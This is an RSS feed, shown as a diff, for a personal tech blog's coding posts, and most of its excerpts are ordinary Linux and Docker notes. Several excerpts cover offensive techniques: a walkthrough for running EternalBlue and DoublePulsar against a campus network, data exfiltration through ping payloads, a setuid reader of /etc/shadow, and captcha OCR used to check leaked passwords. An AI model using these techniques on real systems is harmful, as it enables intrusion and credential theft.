@@ -1,0 +1,274 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Code on wrfly&#39;s blog</title>
+    <link>https://wrfly.kfd.me/tags/code/</link>
+    <description>Recent content in Code on wrfly&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 06 Dec 2017 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://wrfly.kfd.me/tags/code/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>alpine-DNS-problem</title>
+      <link>https://wrfly.kfd.me/posts/alpine-dns-problem/</link>
+      <pubDate>Wed, 06 Dec 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/alpine-dns-problem/</guid>
+      <description>Many softwares use alpine as their run-time base image.
+Recently I set up a docker registry with portus as its front. But I came up with a problem that, registry won&amp;rsquo;t post date: 2017-12-06 title: alpine-DNS-problem
+Firstly I thought it was a bug of docker resigtry, but as I&amp;rsquo;m digging into its code, I found that it&amp;rsquo;s actruely a bug of alpine linux. Alpine linux doesn&amp;rsquo;t have an /etc/nsswitch.conf config file.</description>
+    </item>
+    
+    <item>
+      <title>go程序依赖问题</title>
+      <link>https://wrfly.kfd.me/posts/go%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</link>
+      <pubDate>Tue, 04 Jul 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/go%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</guid>
+      <description>今天遇到一个问题就是，在centos下build出来的golang程序能不能直接放到alpine上面运行。
+实际测试发现，有的可以，有的不可以。
+原因与直觉相同，因为二者系统的动态链接库不同，alpine用了精简版的libc，不是glibc。
+如果build binary的时候没有用到系统的依赖，那么则不会出现依赖性问题。
+解决方法有两种，在build的时候：
+ go build -ldflags &amp;ldquo;-s -w&amp;rdquo; -a -tagsnetgo -installsuffix netgo
+ CGO_ENABLED=0 go build -ldflags &amp;ldquo;-s&amp;rdquo; -a -installsuffix cgo .
+  见：
+ &amp;lt;http://www.jeffsloyer.io/post date: 2017-07-04 title: go程序依赖问题 https://stackoverflow.com/questions/36279253/go-compiled-binary-wont-run-in-an-alpine-docker-container-on-ubuntu-host  </description>
+    </item>
+    
+    <item>
+      <title>shadowbroker大杀器</title>
+      <link>https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/</link>
+      <pubDate>Sun, 16 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/</guid>
+      <description>搞了两天，弄出个差不多的套路，漫游了一波校园网。
+环境要求： python2.6 + pywin32 扩展包
+将 windows/lib/ 下对应的的dll目录添加到系统环境变量里面，还要把 pytrch.py 和 _pytrch 都放到python的扩展包里面，否则运行 fb.py 会报错。
+然后运行 fb.py
+两个可用套路：
+Eternalblue + Doublepulsar use Eternalblue 中间按照提示填入相应的IP和端口信息 需要注意的是这里： [*] Mode :: Delivery mechanism *0) DANE Forward deployment via DARINGNEOPHYTE 1) FB Traditional deployment from within FUZZBUNCH [?] Mode [0] : 1 [+] Run Mode: FB 然后一路确定就OK use Doublepulsar [!] Enter Prompt Mode :: Doublepulsar Module: Doublepulsar ==================== Name Value ---- ----- NetworkTimeout 60 TargetIp 10.</description>
+    </item>
+    
+    <item>
+      <title>还是代理</title>
+      <link>https://wrfly.kfd.me/posts/%E8%BF%98%E6%98%AF%E4%BB%A3%E7%90%86/</link>
+      <pubDate>Sun, 02 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E8%BF%98%E6%98%AF%E4%BB%A3%E7%90%86/</guid>
+      <description>sublimetext的PackageControl连接总是超时，但是手头又没有http的代理，都是用的shadowsocks，然后就要想个办法怎样把socks5代理转换成http代理。
+先是大体搜了一下，解决方案有这两种： - proxychains - tsocks
+但是这两种代理都不复合我的要求，因为他们只能代理一次请求，不会持续listen一个端口，然后提供服务。
+不得已之下，自己&amp;rdquo;写&amp;rdquo;一个吧。
+https://github.com/wrfly/hovers
+其实到后来才搜到，有个老牌的代理软件：privoxy，安装之后，在配置文件里添加 forward-socks5 / 127.0.0.1:1080 . 就可以了。其中127.0.0.1:1080是socks5的代理地址。
+然后在sublime中配置一下： ~/.config/sublime-text-3/Packages/User/Package Control.sublime-settings
+添加：
+&amp;#34;http_proxy&amp;#34;: &amp;#34;localhost:8118&amp;#34; 即可。</description>
+    </item>
+    
+    <item>
+      <title>logrotate和cron</title>
+      <link>https://wrfly.kfd.me/posts/logrotate%E5%92%8Ccron/</link>
+      <pubDate>Thu, 21 Jul 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/logrotate%E5%92%8Ccron/</guid>
+      <description>来公司实习了四天了，遇到了一些大大小小的问题，写脚本遇到的就不详细说了，说一下定时任务和logrotate（日志轮回）。
+两篇文章介绍logrotate：http://articles.slicehost.com/2010/6/30/understanding-logrotate-on-ubuntu-part-1
+http://articles.slicehost.com/2010/6/30/understanding-logrotate-on-ubuntu-part-2
+说的很详细，具体文件可以参考 /etc/logrotate.d/ 目录下的内容。
+给出一个范本：
+/var/log/test/*.log { hourly rotate 4 missingok size 10M notifempty compress create } 从/var/log/test/目录下查找所有的以.log结尾的文件，每小时轮回一次，保存最近的四个，如果文件不存在也OK，限定大小是超过10M的文件，这里要注意的是，如果文件大小已经超过10M了，那下次logrotate运行的时候，就会忽略上面的hourly，直接rotate，notifempty的意思是，如果文件是空的，则不进行rotate，默认情况是进行的，可以查看man手册查阅详细的说明。压缩，并创建一个新的空文件，防止依赖日志文件的应用报错。
+还需要把logrotate放到cron.hourly目录下，这样配置的hourly才会生效。
+还要说的是，可以使用logrotate -f来强制执行轮回。
+在这里实习很好玩，真的有很多事情可以做。</description>
+    </item>
+    
+    <item>
+      <title>从iso到docker</title>
+      <link>https://wrfly.kfd.me/posts/%E4%BB%8Eiso%E5%88%B0docker/</link>
+      <pubDate>Mon, 20 Jun 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%BB%8Eiso%E5%88%B0docker/</guid>
+      <description>一直想找一个从iso镜像到docker镜像的方法。
+然而，
+找不到。
+原来谷歌也有搜不到的东西啊，所以，我就写了这一篇文章。啊，也有可能是我没搜到，不代表别人搜不到。也有可能这种方法早就存在了，只是我不知道（也没人告诉我啊～）。
+啰嗦完毕。
+文件系统 Linux的文件系统比较有趣，感兴趣的话可以man hier一下，会有整个文件系统的介绍，比如/etc是配置文件目录，/dev是设备文件目录，这里需要注意的是这几个目录：
+ /proc /sys /run /dev  这几个目录都是系统启动时自动生成的，他们虽然也属于文件系统的一部分，但是他们是不确定的。也就是说，我们每次开机这些都会变。
+所以下一步打包文件系统的时候就可以无视他们。
+从虚拟机迁移所有文件 http://www.aboutdebian.com/tar-backup.htm
+先贴一个网址，这上面那介绍了怎样用tra打包文件系统。
+具体的命令上面也说的很清楚，我改了一下：
+tar -zcpf /tmp/fullbackup.tar.gz --directory=/ \ --exclude=proc --exclude=sys --exclude=dev \ --exclude=run --exclude=boot --exclude=tmp . 这样就不会包括那些没用的文件了。
+去掉boot的原因是，docker不需要boot。
+打包后的结果如下：
+其中镜像是pentesterlab的shellshock，iso文件也是二十多兆。
+docker import 把打包好的文件搞出来之后，就可以导入到docker了。
+导出的方法有很多啊，挂载一个数据卷（再从别的虚拟机导出来），如果不安装增强功能的话，如果不嫌麻烦安装了增强功能，还可以直接复制到文件夹；或者最简单的，从80端口下载下来，再或者sshfs，再或者用nc什么的，实在不行写个脚本也能传出来的。
+然后，我们得到了这个压缩包，直接导入就好了：
+然后就可以运行啦:
+或者从这个基础镜像修修改改（dockerfile），也可以直接在压缩的文件系统中修改，然后再导入一遍:
+这种方法适用于所有镜像，不过，有一个很严重的问题，就是如果镜像很大的话，push到docker hub上的时候会很慢，除了用第三方的docker registry或者自己搭建，还没想到别的方法（挂代理也是很慢……）。
+Later 以后想做一批关于web安全的docker基础镜像，或者从exploit-db上面找一些有漏洞的app，然后做成docker。
+不知道去了Daocloud有没有实习生福利，比如，账户升级为专业版？hhhh
+很有趣。</description>
+    </item>
+    
+    <item>
+      <title>微容器</title>
+      <link>https://wrfly.kfd.me/posts/%E5%BE%AE%E5%AE%B9%E5%99%A8/</link>
+      <pubDate>Sun, 01 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%BE%AE%E5%AE%B9%E5%99%A8/</guid>
+      <description>日常唠叨 这是一篇拖了两周的博文。
+为了给实习做铺垫，我得多了解一下Docker相关的知识，两周前策划着要写国内docker服务商的对比，现在只起了个头，截了一些图，然后就写不下去了，因为要对比区别，就要压力测试，就要大把的时间，而时间这种消耗品，自己消耗的太快了，再加上自己还拖延症，又是一个烂尾工程。。。好在这一篇容易些，因为只需要花点时间搜集资料，花点时间搭建环境，花点时间测试一下就OK了，压力测试什么的最烦人了。
+不过总的体验来说，网易的蜂巢更像是一个卖VPS的，一个月28的价格也算很良心；灵雀云的话，很有微软的作风，不过微软至少每个页面都有标题，而灵雀云连页面标题都没有，该找个靠谱的前端了，还有微信绑定报错，也没人管，不过他家的镜像市场很不错，网络服务也是很给力，不管是香港服务器还是北京上海等国内服务器，速度都很给力，毕竟有亚马逊和微软合作；然后Daocloud，可以说是最docker的一家公司了，至于怎么docker了，你得试试才知道。
+然后正文开始。
+从容器说起 容器是啥？简单地说就是一个运行应用的盒子，有点类似沙盒，但是沙盒并不集成运行环境，而是依附主机的环境运行程序，给程序一块空间，让他跑。容器呢，则是集成了运行环境的一个空间，相当于在系统中新开了一块地，里面有啥？啥也没有，你得自己往里安装。
+所以容器有有点类似虚拟机的感觉，我想着也是为什么蜂巢把docker做的这么VPS。
+既然是容器，那他肯定是存放东西的，放点啥呢？放应用。
+而这应用又得分门别类的说一说，python是应用吧，ruby是应用吧，nodejs是应用吧，php是应用吧，甚至ubuntu系统都是一个应用。
+大部分的应用都是跑在系统上的，所以他们的基础镜像都是一个系统，这样一想的话，又跟虚拟机差不多了。当然，除了资源消耗。启动速度等等这些。在这里有一篇文章，说的就是关于docker的一些知识，可以花几分钟看一下，以后吹逼的时候也好有话说：https://segmentfault.com/a/1190000002734062
+微容器 顾名思义，微容器就是比一般容器小的容器，为什么比一般容器小呢？因为系统就这么大呀。
+还记得第一个docker容器，helloworld吗，那个就可以理解为一个简单的微容器，因为他小啊，而且还能输出helloworld，好像只有几K吧。
+然而ubuntu：
+REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 4a2102d9faa8 4 months ago 187.9 MB 我这是四个月以前的镜像，现在升级了，估计得更大一点。
+对于服务器来说并不算什么，带宽都这么高了，分分钟就拖完了。但是对于个人来说，网速没那么快，安装升级东西很慢，测试的时候时常需要增增减减，如果要push到dockerhub上去的话，速度也是很感人的，打包的话也不是不可以啊，但是还是有点大。
+那么，就有了微容器，也可以说是一个微型的系统：
+REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest 2bba2978e457 4 weeks ago 4.794 MB busybox latest 47bcc53f74dc 6 weeks ago 1.113 MB 关于busybox，维基百科上有比较详细的介绍：wikipedia - BusyBox
+还有轻量级的系统 alpine : wikipedia - 轻量级linux发行版
+简单地说，微容器就是建立在alpine等轻量级系统上的容器。
+创建一个微容器 得到一个微容器很简单，docker pull alpine就能得到了，进去之后（docker run -dti alpine ash）就是一个小型linux系统。可以用apk add来安装一些常用的软件，比如nginx，php，mysql等等。</description>
+    </item>
+    
+    <item>
+      <title>数字验证码识别</title>
+      <link>https://wrfly.kfd.me/posts/%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</link>
+      <pubDate>Sun, 10 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</guid>
+      <description>昨天整理了一下校园网的密码, 由于数据库是一年前的了, 所以有些密码不能用, 为了检验那些密码是好的, 那些是坏的, 就得去自助服务那里登陆一下才能知道. 但是登陆的时候有个问题, 验证码.
+不过学校的验证码很low, 是下面这种的:
+很容易识别, 于是就研究了一下怎样用Python识别图片中的数字.
+用到的Python库 进行图像处理需要用到两个特殊的库, 第一个是PIL包下的Image模块, 第二个是进行OCR识别的pytesseract模块.
+from PIL import Image # 图片处理, 打开, 关闭, 获取像素信息 from pytesseract import * # OCR识别的库, 对应的CLI命令行为 tesseract 二值化 我们可以看到上面的验证码颜色都比较鲜艳, 虽然看起来好看, 但是对于程序来说这是没有必要且多余的, 因为程序只需要知道某个点是黑的还是白的就好. 所以首先要做的是将图片变成黑白的.
+要将一幅鲜艳的图片转换成黑白的, 还需要一点前戏, 图片灰度. 顾名思义, 就是把那些颜色都去掉, 变成灰色. 而二值化则是将灰色的点变成黑色.
+实现二值化 灰度处理 先把上面的那张1317放大看一下:
+(手动忽略那条截图时留下的细线)
+img = Image.open(&amp;#39;1317.png&amp;#39;) # 打开图片 img = img.convert(&amp;#39;L&amp;#39;) # 转换成灰度图片 img.save(&amp;#39;1317-L.png&amp;#39;) # 保存图片 查看转换的结果:
+可以看到, 那些色彩都没了, 变成了灰色的图片.
+二值化处理 接下来就是将灰色变成黑色, 也就是二值化, 不是0就是255.</description>
+    </item>
+    
+    <item>
+      <title>一点笔记</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Sun, 27 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</guid>
+      <description>文件描述符 File descriptor （之前面试的时候亮哥有问到这个问题，因为以前了解过相关的知识，所以能扯一点，不过还是说错了一部分。）
+首先说说什么是文件描述符：
+我们知道在Linux和Unix中有这样一个概念：“一切皆文件”。那么，我们的输入输出也都可以理解为文件。而且，既然是文件的话，那么就一定有一个实体，无论是真实的实体还是抽象出来的实体。
+文件描述符就是这样一种实体，它代表了对文件操作的输入和输出的抽象实体。
+然后我们再记住几个数字：
+   数字 含义     0 标准输入（stdin）   1 标准输出（stdout）   2 标准错误（stderr）    fd0就表示标准输入，fd1则是标准输出，fd2就是标准错误输出。
+那么这些文件存放在哪儿呢？ 在linux下，可以从这里找到他们：
+/proc/process_id/fd/
+做个实验： 打开一个终端，然后查看本进程的进程号： 进程号为14684，然后去寻找它的文件描述符： (注：其实可以直接进入 /proc/self/fd/目录，两者是等价的。)
+ /proc/self This directory refers to the process accessing the /proc filesystem, and is identical to the /proc directory named by the process ID of the same process.
+ 我们试着往里面写点东西： 看到了吗？ 我们写入到1里面的话都输出到了上一个终端里面。</description>
+    </item>
+    
+    <item>
+      <title>linux-lcx</title>
+      <link>https://wrfly.kfd.me/posts/linux-lcx/</link>
+      <pubDate>Tue, 08 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux-lcx/</guid>
+      <description>先po代码：
+https://gist.github.com/wrfly/a55b11926e230e05a9a6
+然后说用法：
+➤ ./lcx Usage:./lcx -m method [host1] port1 [host2] port2 [-v] [-log filename] -v: version -m1: PORT1 HOST2 PORT2 -m2: PORT1 PORT2 -m3: HOST1 PORT1 HOST2 PORT2 -log: log the data For methods: -m1: listen on PORT1 and connect to HOST2:PORT2 -m2: listen on PORT1 and PORT2 -m3: connect to HOST1:PORT1 and HOST2:PORT2 粗略的解释下，希望对别人有帮助。
+mode 1: 把本机的 port1 跟 host2 的 port2 连接起来(bind to connect)
+➤ ./lcx -m1 8080 kfd.</description>
+    </item>
+    
+    <item>
+      <title>几个hack小技巧</title>
+      <link>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</link>
+      <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
+      <description>ping  -p pattern You may specify up to 16 ``pad&amp;rdquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+ 如果渗透到了一台机子却只能往外发ping怎么办？ -p 就可以搞定了。
+举个例子
+ping -c 1 -p `echo -n hello | xxd -ps` anoth_server 然后在another_server上面通过tcpdump就可以接收到hello。
+$ tcpdump -i vboxnet0 -A tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on vboxnet0, link-type EN10MB (Ethernet), capture size 262144 bytes IP 192.</description>
+    </item>
+    
+    <item>
+      <title>文件的s标志位</title>
+      <link>https://wrfly.kfd.me/posts/%E6%96%87%E4%BB%B6%E7%9A%84s%E6%A0%87%E5%BF%97%E4%BD%8D/</link>
+      <pubDate>Tue, 10 Nov 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%96%87%E4%BB%B6%E7%9A%84s%E6%A0%87%E5%BF%97%E4%BD%8D/</guid>
+      <description>文件的S标志位 文件的 rwx 标志位，分别是 read，write，execute，用数字表示是 4,2,1.
+那么文件的s标志位呢？
+s标志位是 SET UID属性，指的是，这个文件在运行的时候会拥有文件所有者的权限，只要牵扯到权限这个词，那就好玩了。
+S标志位的前提：文件必须是二进制可执行文件。
+各种脚本是不行的，因为脚本中调用了其他的一些二进制程序，然而这些二进制程序并不具备S标志位，所以脚本的S标志位无效。
+鸟哥的书上是用了 passwd 这个程序来说的，passwd的owner是root，而且passwd也具备s标志位，所以当你在运行passwd这个程序的时候就会拥有root的权限，这个root权限只是在当你运行passwd程序时所拥有的，不过，如果你要是能溢出passwd的话，你就可以提权了 ：）
+做一个小测试： 普通用户是无法读取 /etc/shadow 这个文件的内容的，因为这个文件的权限是640，所有者是root，用户组是shadow，只有shadow用户组的人或者root用户才能够读取里面的内容。那么我们就来写个小程序毒一下里面的内容：
+#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main(){ FILE *file; char ch; if( (file = fopen(&amp;#34;/etc/shadow&amp;#34;,&amp;#34;r&amp;#34;)) == NULL ){ printf(&amp;#34;Permission denied!\n&amp;#34;); exit(1); } ch = fgetc(file); while(ch != EOF){ putchar(ch); ch = fgetc(file); } fclose(file); getch() } gcc catshadwo.c -o catshadow
+编译之后运行一下，如果不是root用户或者shadow用户组的人运行这个程序，就会提示不允许这样做。
+那么我们把这个文件给root，然后再给他s标志位：
+sudo chown root catshadow &amp;amp;&amp;amp; sudo chmod +s catshadow
+OK，再来运行一下就可以读取shadow里面的内容了。</description>
+    </item>
+    
+    <item>
+      <title>Bash and NC chat room</title>
+      <link>https://wrfly.kfd.me/posts/bash-and-nc-chat-room/</link>
+      <pubDate>Tue, 07 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/bash-and-nc-chat-room/</guid>
+      <description>代码 https://gist.github.com/wrfly/3cafd411dc42822a9b16
+效果 ![nchat-1/img/nchat/1.png)
+![nchat-2/img/nchat/2.png)
+![nchat-3/img/nchat/3.png)
+介绍 一开始是为了计算机网络的大作业，说是要写一个聊天软件，要用socket，但是我C学的不好，觉得要是让我写C代码，至少得一周才能吃透，所以就想了个懒办法，Bash和Ncat。
+一开始的思路是让nc建立连接，通过echo输出，read读取，但是这样只能局限于NC那个界面，而且用户之间并没有标识，negative。
+期间接触了一点点bash网络编程的相关知识，比如exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80和echo &amp;quot;balabala&amp;quot; 1&amp;gt;&amp;amp;3和cat &amp;lt;&amp;amp;3
+A$ ncat -lp 8080 B$ exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80 B$ echo &amp;#34;balabala&amp;#34; 1&amp;gt;&amp;amp;3 B$ cat &amp;lt;&amp;amp;3 通过这种方式来绑定端口或者向端口IO
+信息加密解密方法：
+en(){ echo $1|openssl aes-256-cbc -k pass -e |openssl aes-256-cbc -k pass -d; } 这个小函数是用来测试加密解密的。
+然后说下脚本的思路：
+ 登陆，确定用户身份，用户名长度要过滤，防止恶意输入 房间选择，也要过滤，因为是要创建一个新的文档，所以必须过滤掉&amp;rdquo;. / \&amp;ldquo;等一系列特殊字符，默认是public房间，即所有用户输入输出均在public文件中。 消息IO，这个是聊天的核心，但是实现起来并不是很难，tail -f一直检测文件变化，因为所有的用户输入都保存到了“chat_room”这个文件里，当有新用户发言的时候所有同一房间下的用户都会收到消息，相当于群聊。如果是想两个人聊天，就可以两个人新建一个聊天室，也就相当于一对一的聊天了。 数据包格式，这个好弄，时间，用户名，消息数据。 安全性。远程的安全性永远的不到保障，所以只能在客户端解决。Wait~ 扩展：文件传输，表情包，tmux扩展，发送图片（asciiview）  问题  进程间通信，用tail读取文件 父进程退出之后，子进程不退出（tail -f &amp;ndash;pid $$） kill 命令用法 命令行输出颜色 （echo -e &amp;ldquo;balabala&amp;rdquo;） $$ 和 $!</description>
+    </item>
+    
+    <item>
+      <title>大数的阶乘</title>
+      <link>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</link>
+      <pubDate>Sun, 10 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</guid>
+      <description>To calculate factorial in linux c &amp;amp; bash shell &amp;amp; bc.
+linux c version: #include &amp;lt;stdio.h&amp;gt;int big[10001][800],len[10001],BASE=10000; int i,j,tmp,up,n; void print(int n){ printf(&amp;#34;%d&amp;#34;,big[n][len[n]-1]); for(i=len[n]-2; i &amp;gt;= 0; i--)printf(&amp;#34;%04d&amp;#34;,big[n][i]); printf(&amp;#34;\n&amp;#34;); } int main(){ big[0][0] = big[1][0] = len[0] = len[1] = 1; //0和1的阶乘都是1  for(i=2; i&amp;lt;=10000; i++){ //计算10000以内的所有数的阶乘  up = 0; for(j=0; j&amp;lt;len[i-1]; j++){ tmp = up + i * big[i-1][j]; up = tmp / BASE; tmp = tmp % BASE; big[i][j] = tmp; } if(up &amp;gt; 0){ big[i][j] = up;len[i] = j+1; } else len[i] = j; } while(~scanf(&amp;#34;%d&amp;#34;,&amp;amp;n))print(n); return 0; } bash shell version: #!</description>
+    </item>
+    
+    <item>
+      <title>linux下利用C实现输入密码返回*的功能</title>
+      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E5%88%A9%E7%94%A8c%E5%AE%9E%E7%8E%B0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E8%BF%94%E5%9B%9E%E7%9A%84%E5%8A%9F%E8%83%BD/</link>
+      <pubDate>Mon, 22 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E5%88%A9%E7%94%A8c%E5%AE%9E%E7%8E%B0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E8%BF%94%E5%9B%9E%E7%9A%84%E5%8A%9F%E8%83%BD/</guid>
+      <description>C++也兼容这个功能
+#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;termios.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;assert.h&amp;gt;int getch(void); char psw[20];//初始化密码为空&amp;#34;&amp;#34;; int length=0; //初始化密码长度 void inputPassword()//用于输入并回显*为密码 { char temp_c; printf(&amp;#34;password:&amp;#34;); while(1) { temp_c=getch(); //输入一个字符  if(temp_c!=&amp;#39;\n&amp;#39;) //判断该字符是不为回车，如果是则退出while  { switch (temp_c) { case 127: if(length!=0) { printf(&amp;#34;\b\b&amp;#34;); length--; } else; break; default: printf(&amp;#34;*&amp;#34;); //可用用你喜欢的任意字符，如改为puts&amp;#34;&amp;#34;;则无回显  psw[length] = temp_c;//连成字符串；  length++; break; } } else break; } psw[length] = &amp;#39;\0&amp;#39;; } char* getpassword()//返回一个密码字符串。 { return psw; } int getch(void) { int c=0; struct termios org_opts, new_opts; int res=0; //----- store old settings -----------  res=tcgetattr(STDIN_FILENO, &amp;amp;org_opts); assert(res==0); //---- set new terminal parms --------  memcpy(&amp;amp;new_opts, &amp;amp;org_opts, sizeof(new_opts)); new_opts.</description>
+    </item>
+    
+  </channel>
+</rss>
